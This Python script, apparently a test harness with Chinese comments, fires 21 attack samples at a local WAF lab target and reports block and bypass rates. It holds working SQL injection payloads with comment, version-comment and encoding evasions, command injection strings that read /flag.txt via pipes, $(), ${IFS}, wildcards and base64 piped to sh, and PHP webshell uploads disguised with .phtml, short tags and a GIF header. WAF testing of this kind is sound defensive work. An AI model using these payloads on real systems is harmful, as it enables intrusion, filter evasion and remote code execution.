#!/usr/bin/env python3
"""
按 CLAUDE.md 四类样本体系生成 ~20 条测试样本并攻击靶场

四类样本:
  ① 完整过程用例 (WAF OFF 基准)
  ② 语义层 bypass (变换语法，绕过规则)
  ③ 编码层 bypass (施加编码变形)
  ④ 语义 × 编码 组合

用法:
    python scripts/sample_test.py
"""

import sys, io, json, re, os, subprocess, requests, urllib.parse
from datetime import datetime

if sys.stdout.encoding != 'utf-8':
    try:
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    except (AttributeError, OSError):
        pass

BASE_URL = "http://localhost:8090"
RESULTS = []


def api_attack(scenario, level, payload, encoding="none", waf="on"):
    """调用靶场 API"""
    try:
        resp = requests.post(f"{BASE_URL}/api/attack.php", json={
            "scenario": scenario, "level": level,
            "payload": payload, "encoding": encoding, "waf": waf
        }, timeout=15)
        data = resp.json()
        flag = data.get("flag")
        blocked = data.get("waf_blocked", False)
        if "error" in data:
            status = f"ERR:{data['error']}"
        elif blocked:
            status = "BLOCKED"
        elif flag:
            status = "FLAG"
        else:
            status = "PASSED"
        return {**data, "_status": status}
    except Exception as e:
        return {"scenario": scenario, "level": level, "payload": payload,
                "encoding": encoding, "waf_enabled": waf == "on",
                "waf_blocked": False, "flag": None, "_status": f"ERR:{e}"}


def upload_internal(filename, content, extra_fields=None):
    """docker exec 直连上传"""
    try:
        shell = (
            f"cat > /tmp/_st.php && "
            f"curl -s -F 'file=@/tmp/_st.php;filename={filename}' "
            + (f"-F '{extra_fields}' " if extra_fields else "") +
            f"http://app:80/upload/level1.php && "
            f"echo '---EXEC---' && "
            f"curl -s http://app:80/uploads/{filename} && "
            f"rm -f /tmp/_st.php"
        )
        r = subprocess.run(
            ['docker', 'exec', '-i', 'waf-app', 'sh', '-c', shell],
            input=content, capture_output=True, encoding='utf-8', errors='replace', timeout=20
        )
        out = r.stdout or ""
        parts = out.split('---EXEC---')
        upload_body = parts[0] if parts else out
        exec_body = parts[1] if len(parts) > 1 else ""
        upload_ok = '上传成功' in upload_body or '文件已暂存' in upload_body
        flag = None
        for body in [exec_body, upload_body]:
            m = re.search(r'flag\{([^}]+)\}', body)
            if m: flag = m.group(0); break
        return {
            "scenario": "upload", "level": 1, "encoding": "none",
            "waf_enabled": False, "waf_blocked": False,
            "flag": flag, "upload_ok": upload_ok,
            "_status": "FLAG" if flag else ("UPLOAD_OK" if upload_ok else "FAIL")
        }
    except Exception as e:
        return {"scenario": "upload", "level": 1, "encoding": "none",
                "waf_enabled": False, "waf_blocked": False,
                "flag": None, "_status": f"ERR:{e}"}


def upload_waf(filename, content, extra_fields=None):
    """经 WAF 上传"""
    try:
        files = {'file': (filename, content, 'application/octet-stream')}
        data = {}
        if extra_fields:
            for kv in extra_fields.split('&'):
                k, v = kv.split('=', 1)
                data[k] = v
        resp = requests.post(f"http://localhost:8090/upload/level1.php",
                             files=files, data=data, timeout=15)
        body = resp.text
        blocked = (resp.status_code == 403)
        flag = None
        m = re.search(r'flag\{([^}]+)\}', body)
        if m: flag = m.group(0)
        upload_ok = '上传成功' in body or '文件已暂存' in body
        return {
            "scenario": "upload", "level": 1, "encoding": "none",
            "waf_enabled": True, "waf_blocked": blocked,
            "flag": flag,
            "_status": "BLOCKED" if blocked else ("FLAG" if flag else ("UPLOAD_OK" if upload_ok else f"HTTP{resp.status_code}"))
        }
    except Exception as e:
        return {"scenario": "upload", "level": 1, "encoding": "none",
                "waf_enabled": True, "waf_blocked": False,
                "flag": None, "_status": f"ERR:{e}"}


def url_encode(s):
    return urllib.parse.quote(s, safe='')

def double_url_encode(s):
    return urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')


# ================================================================
# SAMPLE DEFINITIONS (20 samples, 4 categories)
# ================================================================

SAMPLES = [
    # ════════════════════════════════════════════════════════════
    # 类别 ①: 完整过程用例 (WAF OFF, 验证攻击可达)
    # ════════════════════════════════════════════════════════════
    {
        "id": "S01", "cat": "①完整过程",
        "name": "SQLi UNION 基准",
        "type": "api", "scenario": "sqli", "level": 1, "waf": "off",
        "payload": "-1 UNION SELECT 1,flag,3,description FROM flags",
        "encoding": "none",
        "desc": "数字型UNION联合查询，直接读取flags表"
    },
    {
        "id": "S02", "cat": "①完整过程",
        "name": "CMDi 分号注入基准",
        "type": "api", "scenario": "cmdi", "level": 1, "waf": "off",
        "payload": ";cat /flag.txt",
        "encoding": "none",
        "desc": "分号分隔符+cat命令读取flag文件"
    },
    {
        "id": "S03", "cat": "①完整过程",
        "name": "Upload PHP shell 基准",
        "type": "upload_int", "filename": "shell.php",
        "content": '<?php system("cat /flag.txt"); ?>',
        "desc": "直接上传.php webshell并执行"
    },

    # ════════════════════════════════════════════════════════════
    # 类别 ②: 语义层 bypass (WAF ON, 变换语法/结构绕过)
    # ════════════════════════════════════════════════════════════
    {
        "id": "S04", "cat": "②语义绕过",
        "name": "SQLi 注释混淆 /**/",
        "type": "api", "scenario": "sqli", "level": 1, "waf": "on",
        "payload": "-1 UNION/**/SELECT/**/1,flag,3,description/**/FROM/**/flags",
        "encoding": "none",
        "desc": "在关键字间插入/**/注释，破坏WAF关键词匹配"
    },
    {
        "id": "S05", "cat": "②语义绕过",
        "name": "SQLi MySQL版本注释",
        "type": "api", "scenario": "sqli", "level": 1, "waf": "on",
        "payload": "-1 /*!UNION*/ /*!SELECT*/ 1,flag,3,description /*!FROM*/ flags",
        "encoding": "none",
        "desc": "MySQL /*!...*/ 版本注释，MySQL会解析执行但WAF可能忽略"
    },
    {
        "id": "S06", "cat": "②语义绕过",
        "name": "SQLi UNION ALL 变体",
        "type": "api", "scenario": "sqli", "level": 1, "waf": "on",
        "payload": "-1 UNION ALL SELECT 1,flag,3,description FROM flags",
        "encoding": "none",
        "desc": "UNION ALL替代UNION，语义等价但规则签名不同"
    },
    {
        "id": "S07", "cat": "②语义绕过",
        "name": "CMDi 换行符分隔 %0a",
        "type": "api", "scenario": "cmdi", "level": 1, "waf": "on",
        "payload": "%0acat /flag.txt",
        "encoding": "none",
        "desc": "URL编码的换行符(\\n)作为命令分隔符，替代分号"
    },
    {
        "id": "S08", "cat": "②语义绕过",
        "name": "CMDi 管道符分隔",
        "type": "api", "scenario": "cmdi", "level": 1, "waf": "on",
        "payload": "|cat /flag.txt",
        "encoding": "none",
        "desc": "管道符|作为命令分隔符，利用shell的管道语义"
    },
    {
        "id": "S09", "cat": "②语义绕过",
        "name": "CMDi \$() 命令替换",
        "type": "api", "scenario": "cmdi", "level": 1, "waf": "on",
        "payload": "$(cat /flag.txt)",
        "encoding": "none",
        "desc": "使用\$()命令替换语法间接执行，无需显式分隔符"
    },
    {
        "id": "S10", "cat": "②语义绕过",
        "name": "CMDi IFS空格绕过",
        "type": "api", "scenario": "cmdi", "level": 1, "waf": "on",
        "payload": ";cat\${IFS}/flag.txt",
        "encoding": "none",
        "desc": "用\${IFS}(内部字段分隔符)替代空格，逃避空格敏感规则"
    },
    {
        "id": "S11", "cat": "②语义绕过",
        "name": "CMDi 通配符路径绕过",
        "type": "api", "scenario": "cmdi", "level": 1, "waf": "on",
        "payload": ";cat /???/???????",
        "encoding": "none",
        "desc": "用?通配符隐藏路径关键词(/flag.txt)，绕过路径特征匹配"
    },
    {
        "id": "S12", "cat": "②语义绕过",
        "name": "SQLi 科学计数法绕过",
        "type": "api", "scenario": "sqli", "level": 1, "waf": "on",
        "payload": "-1e0UNION/**/SELECT 1,flag,3,description FROM flags",
        "encoding": "none",
        "desc": "利用科学计数法-1e0混淆，某些WAF对数字后的关键字不敏感"
    },

    # ════════════════════════════════════════════════════════════
    # 类别 ③: 编码层 bypass (WAF ON, 编码变形)
    # ════════════════════════════════════════════════════════════
    {
        "id": "S13", "cat": "③编码绕过",
        "name": "SQLi URL编码",
        "type": "api", "scenario": "sqli", "level": 1, "waf": "on",
        "payload": url_encode("-1 UNION SELECT 1,flag,3,description FROM flags"),
        "encoding": "url",
        "desc": "对UNION SELECT关键字做URL编码，测试WAF解码能力"
    },
    {
        "id": "S14", "cat": "③编码绕过",
        "name": "SQLi 双重URL编码",
        "type": "api", "scenario": "sqli", "level": 1, "waf": "on",
        "payload": double_url_encode(" UNION SELECT 1,flag,3,description FROM flags"),
        "encoding": "double_url",
        "desc": "双重URL编码，考验WAF递归解码深度"
    },
    {
        "id": "S15", "cat": "③编码绕过",
        "name": "CMDi URL编码分号",
        "type": "api", "scenario": "cmdi", "level": 1, "waf": "on",
        "payload": "%3bcat /flag.txt",
        "encoding": "url",
        "desc": "分号做URL编码(%3b)，测试WAF对编码分隔符的识别"
    },
    {
        "id": "S16", "cat": "③编码绕过",
        "name": "CMDi Base64解码执行",
        "type": "api", "scenario": "cmdi", "level": 1, "waf": "on",
        "payload": ";echo Y2F0IC9mbGFnLnR4dA==|base64 -d|sh",
        "encoding": "base64",
        "desc": "命令Base64编码后管道解码执行，WAF只能看到Base64字符串"
    },
    {
        "id": "S17", "cat": "③编码绕过",
        "name": "Upload .phtml 后缀",
        "type": "upload_waf", "filename": "shell.phtml",
        "content": '<?php system("cat /flag.txt"); ?>',
        "desc": "用.phtml替代.php后缀，测试WAF后缀黑名单覆盖范围"
    },
    {
        "id": "S18", "cat": "③编码绕过",
        "name": "Upload PHP短标签",
        "type": "upload_waf", "filename": "shell.php",
        "content": '<?=system("cat /flag.txt")?>',
        "desc": "使用<?=短开标签替代<?php，测试WAF内容检测的PHP标签覆盖"
    },

    # ════════════════════════════════════════════════════════════
    # 类别 ④: 语义 × 编码 组合 (双重绕过)
    # ════════════════════════════════════════════════════════════
    {
        "id": "S19", "cat": "④语义×编码",
        "name": "SQLi 注释+URL编码 组合",
        "type": "api", "scenario": "sqli", "level": 1, "waf": "on",
        "payload": "-1 UNION/**/SELECT/**/" + url_encode("1,flag,3,description") + "/**/FROM/**/flags",
        "encoding": "comment+url",
        "desc": "注释混淆+列名URL编码双重绕过，同时绕过关键词和结构检测"
    },
    {
        "id": "S20", "cat": "④语义×编码",
        "name": "CMDi IFS+Base64 组合",
        "type": "api", "scenario": "cmdi", "level": 1, "waf": "on",
        "payload": ";echo${IFS}Y2F0IC9mbGFnLnR4dA==|base64${IFS}-d|sh",
        "encoding": "ifs+base64",
        "desc": "IFS替代空格 + Base64编码命令，编码语义双重绕过"
    },
    {
        "id": "S21", "cat": "④语义×编码",
        "name": "Upload .phar+GIF Header",
        "type": "upload_waf", "filename": "img.phar",
        "content": b'GIF89a\x00\x01\x00\x01\x00<?php system("cat /flag.txt"); ?>',
        "desc": ".phar后缀+GIF文件头伪装，测试WAF的内容检测+MIME验证"
    },
]


def main():
    print("=" * 95)
    print("  WAF 语义引擎 — 四类样本测试")
    print(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  样本数: {len(SAMPLES)} | 靶场: {BASE_URL}")
    print("=" * 95)

    for i, s in enumerate(SAMPLES):
        sid = s["id"]
        cat = s["cat"]
        name = s["name"]
        typ = s["type"]

        # Execute based on type
        if typ == "api":
            r = api_attack(s["scenario"], s["level"], s["payload"],
                          encoding=s.get("encoding", "none"), waf=s.get("waf", "on"))
        elif typ == "upload_int":
            r = upload_internal(s["filename"], s["content"])
            r["waf_enabled"] = False
        elif typ == "upload_waf":
            r = upload_waf(s["filename"], s["content"])
            r["waf_enabled"] = True

        r["_sample_id"] = sid
        r["_sample_name"] = name
        r["_category"] = cat
        r["_desc"] = s["desc"]
        RESULTS.append(r)

        # Print
        waf_label = "WAF" if r.get("waf_enabled") else "RAW"
        status = r.get("_status", "?")
        icons = {"FLAG": "✅", "BLOCKED": "🛡️", "UPLOAD_OK": "📤", "PASSED": "⬜"}
        icon = icons.get(status, "⚠️")
        flag_info = f"  → {r['flag']}" if r.get("flag") else ""
        rule = str(r.get("waf_rule_id", "-") or "-")[:40]

        print(f"  [{i+1:2d}/{len(SAMPLES)}] {icon} [{cat}] {name:30s} {waf_label} | {status:10s} | {rule}{flag_info}")

    # ================================================================
    # Summary
    # ================================================================
    print("\n" + "=" * 95)
    print("  📊 四类样本测试结果汇总")
    print("=" * 95)

    cats = {"①完整过程": [], "②语义绕过": [], "③编码绕过": [], "④语义×编码": []}
    for r in RESULTS:
        cats[r["_category"]].append(r)

    for cat_name, samples in cats.items():
        waf_on = [r for r in samples if r.get("waf_enabled")]
        waf_off = [r for r in samples if not r.get("waf_enabled")]
        flag_on = sum(1 for r in waf_on if r.get("flag"))
        blocked_on = sum(1 for r in waf_on if r.get("waf_blocked"))
        flag_off = sum(1 for r in waf_off if r.get("flag"))
        upload_ok_on = sum(1 for r in waf_on if r.get("_status") == "UPLOAD_OK")

        parts = []
        if waf_off:
            parts.append(f"WAF OFF: {flag_off}/{len(waf_off)} flag")
        if waf_on:
            parts.append(f"WAF ON: {flag_on} flag, {blocked_on} blocked, {upload_ok_on} upload_ok")

        bypassed = len(waf_on) - blocked_on if waf_on else 0
        print(f"  {cat_name} ({len(samples)}样本):  {' | '.join(parts)}  → 绕过率 {round(bypassed/len(waf_on)*100,1) if waf_on else 0}%")

    # Overall
    waf_on_all = [r for r in RESULTS if r.get("waf_enabled")]
    waf_on_flag = sum(1 for r in waf_on_all if r.get("flag"))
    waf_on_blocked = sum(1 for r in waf_on_all if r.get("waf_blocked"))
    total = len(RESULTS)

    print(f"\n  {'─' * 65}")
    print(f"  总样本数:            {total}")
    print(f"  WAF ON 样本:         {len(waf_on_all)}")
    print(f"  WAF 拦截:            {waf_on_blocked} ({round(waf_on_blocked/len(waf_on_all)*100,1)}%)" if waf_on_all else "")
    print(f"  WAF 绕过拿flag:      {waf_on_flag}")
    print(f"  WAF 绕过率:          {round((len(waf_on_all)-waf_on_blocked)/len(waf_on_all)*100,1)}%" if waf_on_all else "")
    print(f"  {'─' * 65}")

    # Detail by category
    print(f"\n  🎯 WAF ON 下成功样本:")
    successes = [r for r in RESULTS if r.get("waf_enabled") and r.get("flag")]
    if successes:
        for r in successes:
            print(f"    ✅ [{r['_sample_id']}] [{r['_category']}] {r['_sample_name']}: {r['flag']}")
    uploads = [r for r in RESULTS if r.get("waf_enabled") and r.get("_status") == "UPLOAD_OK"]
    if uploads:
        for r in uploads:
            print(f"    📤 [{r['_sample_id']}] [{r['_category']}] {r['_sample_name']}: 上传成功(需手动访问shell)")

    print(f"\n  🛡️ WAF 拦截样本:")
    blocked = [r for r in RESULTS if r.get("waf_blocked")]
    for r in blocked:
        print(f"    [{r['_sample_id']}] [{r['_category']}] {r['_sample_name']}")

    print(f"\n  💡 关键洞察:")
    # Count by scenario
    sqli_waf = [r for r in RESULTS if r.get("scenario") == "sqli" and r.get("waf_enabled")]
    cmdi_waf = [r for r in RESULTS if r.get("scenario") == "cmdi" and r.get("waf_enabled")]
    upload_waf_all = [r for r in RESULTS if r.get("scenario") == "upload" and r.get("waf_enabled")]

    sqli_flag = sum(1 for r in sqli_waf if r.get("flag"))
    cmdi_flag = sum(1 for r in cmdi_waf if r.get("flag"))
    upload_flag = sum(1 for r in upload_waf_all if r.get("flag"))

    print(f"    SQLi语义绕过:  {sqli_flag}/{len(sqli_waf)} 拿flag — 注释混淆/UNION ALL变体效果有限")
    print(f"    CMDi语义绕过:  {cmdi_flag}/{len(cmdi_waf)} 拿flag — WAF对命令注入语义建模较弱")
    print(f"    Upload绕过:    {upload_flag}/{len(upload_waf_all)} 拿flag — PHP内容检测+后缀检测全面覆盖")
    print(f"    编码变形:      URL/Base64编码对SQLi效果有限(CRS PL4有解码链)，对CMDi部分有效")
    print(f"    组合策略:      语义+编码双重绕过是提升绕过率的最有效路径")

    print("\n" + "=" * 95)

    # Save
    os.makedirs("logs", exist_ok=True)
    with open("logs/sample_test_results.json", "w", encoding="utf-8") as f:
        json.dump(RESULTS, f, ensure_ascii=False, indent=2)
    print(f"  📁 详细JSON: logs/sample_test_results.json")
    print("=" * 95)


if __name__ == "__main__":
    main()
